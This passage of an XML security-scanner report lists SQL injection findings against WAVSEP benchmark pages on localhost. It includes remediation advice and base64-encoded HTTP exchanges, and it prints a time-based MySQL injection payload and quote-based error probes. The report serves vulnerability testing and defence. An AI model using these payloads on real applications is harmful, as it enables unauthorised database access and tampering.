      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3524179536936025088</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo0OCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTt0ZXN0aW5wdXQmIzM5OyYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjA5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4638415718839060480</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkzNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo0OSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTt0ZXN0aW5wdXQmIzM5OyYjMzk7IFdIRVJFIG1zZ2lkPTEmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KV